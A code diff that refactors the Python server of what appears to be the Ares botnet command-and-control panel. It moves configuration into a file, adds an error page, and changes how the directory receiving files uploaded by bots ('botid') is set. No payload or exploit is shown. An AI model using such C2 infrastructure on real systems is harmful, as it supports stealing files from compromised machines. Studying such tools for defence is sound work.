@@ -8,17 +8,13 @@ import string
 import hashlib
 
 
-UPLOAD_DIR = os.path.join(os.path.dirname(os.path.realpath(__file__)), "uploads")
-if not os.path.exists(UPLOAD_DIR):
-    os.makedirs(UPLOAD_DIR)
 COOKIE_NAME = "ARESSESSID"
 SESSION_TIMEOUT = 300
-
+UPLOAD_DIR = ""
 
 pending_uploads = []
 session_cookie = None
 last_session_activity = 0
-app = None
 
 html_escape_table = {
     "&": "&amp;",
@@ -27,6 +23,12 @@ html_escape_table = {
     ">": "&gt;",
     "<": "&lt;",
 }
+
+
+def error_page(status, message, traceback, version):
+    with open("error.html", "r") as f:
+        html = f.read()
+        return html % (status, status, message)
 
 
 def html_escape(text):
@@ -221,9 +223,6 @@ class API(object):
     def upload(self, botid, src, uploaded):
         if not validate_botid(botid):
             raise cherrypy.HTTPError(403)
-        up_dir = os.path.join(UPLOAD_DIR, botid)
-        if not os.path.exists(up_dir):
-            os.makedirs(up_dir)
         expected_file = src
         if expected_file not in pending_uploads and src.endswith(".zip"):
             expected_file = src.split(".zip")[0]
@@ -234,6 +233,8 @@ class API(object):
         else:
             print "Unexpected file: %s" % src
             raise cherrypy.HTTPError(403)
+        global UPLOAD_DIR
+        up_dir = os.path.join(UPLOAD_DIR, botid)
         while os.path.exists(os.path.join(up_dir, src)):
             src = "_" + src
         save_path = os.path.join(up_dir, src)
@@ -249,28 +250,19 @@ class API(object):
 
 
 def main():
-    global app
-    config = {'global': {'server.socket_host': '127.0.0.1',
-                'server.socket_port': 8080,
-                'environment': 'production',
-                },
-                '/': {  
-                    'response.headers.server': "Ares",
-                },
-                '/static': {
-                    'tools.staticdir.on': True,
-                    'tools.staticdir.dir':  os.path.join(os.path.dirname(os.path.realpath(__file__)), "static")
-                },
-                '/uploads': {
-                    'tools.staticdir.on': True,
-                    'tools.staticdir.dir':  UPLOAD_DIR
-                },
-               }
     app = Main()
     app.api = API()
     app.cnc = CNC()
-    print "[*] Server started on %s:%s" % (config["global"]["server.socket_host"], config["global"]["server.socket_port"])
-    cherrypy.quickstart(app, config=config)
+    cherrypy.config.update("conf/server.conf")
+    app = cherrypy.tree.mount(app, "", "conf/server.conf")
+    app.merge({"/": { "error_page.default": error_page}})
+    print "[*] Server started on %s:%s" % (cherrypy.config["server.socket_host"], cherrypy.config["server.socket_port"])
+    global UPLOAD_DIR
+    UPLOAD_DIR = app.config['/uploads']['tools.staticdir.dir']
+    if not os.path.exists(UPLOAD_DIR):
+        os.makedirs(UPLOAD_DIR)
+    cherrypy.engine.start()
+    cherrypy.engine.block()
 
 
 if __name__ == "__main__":
